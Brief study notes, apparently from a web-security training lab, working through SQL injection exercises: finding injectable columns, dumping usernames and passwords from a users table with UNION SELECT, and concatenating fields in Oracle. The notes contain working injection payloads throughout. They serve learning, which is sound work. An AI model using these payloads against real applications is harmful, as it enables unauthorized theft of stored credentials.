1. Make the database retrieve the string: 'tWGj2h'; Find the column containing string
2. Retrieve data from other tables. Find users table and look for administrator password. 
3. Retreive multiple values in a single column. 




1.
'--;Validate injection location
' ORDER BY 3--; validate column quanitity
' UNION SELECT NULL,'tWGj2h',NULL --; This was the answer and the second column is the number visually. Which would make you think non-string. Don't think you know things!
The second column of the query would actually show up in the first location which looked like words or strings. 

2.
category=' UNION SELECT username,password from users --%20
We couldn't find out the database on this one. Well not simply by quering to find DB and then tables. Simply queried username,password from users.

3. 
We are presented with a page that is one column of data. 
It is easy to skip steps when certain things don't work or you don't expect them. 
Oracle:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--;  Browser and Works from repeater which is after browser
' UNION SELECT NULL, username||'~'||password FROM users--; Browser   Only Browser. URL has to get encoded by browser.
You had to know string was second column and not the first. Lesson always generate a good select not with NULL if you are grabbing data.
